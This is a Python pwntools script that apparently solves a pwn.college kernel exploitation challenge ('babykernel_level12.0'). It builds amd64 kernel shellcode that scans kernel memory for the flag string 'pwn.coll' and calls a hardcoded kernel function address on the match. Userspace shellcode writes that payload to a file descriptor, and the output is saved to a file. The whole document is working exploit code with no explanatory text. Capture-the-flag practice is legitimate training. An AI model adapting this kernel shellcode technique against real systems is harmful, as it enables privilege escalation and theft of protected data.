from pwn import *

context.arch = "amd64"
# ffffffff810856e0 T find_task_by_vpid
# ffffffff81190040 T access_process_vm

#p = process("/challenge/babykernel_level12.0")
#pid =  p.pid + 1

ker_byte_codes = asm('''
kernel_shellcode:
    mov r15, 0xffff888000000000

label2:

    xor rdi, rdi
    mov rdi, qword ptr [rip+label] 
    xor r14, r14
    mov r14, qword ptr [r15]
    cmp rdi, r14
    jne fail

    lea rdi, [r15]
    mov rbx, 0xffffffff810b69a9
    call rbx
fail:
    add r15, 8
    jmp label2

    ret
label:
    .string "pwn.coll"



''')
byte_codes = asm(

    shellcraft.write(3, ker_byte_codes, len(ker_byte_codes)) + "ret\n")

with open("b", "wb") as fd:
    fd.write(byte_codes)

#p.send(byte_codes)
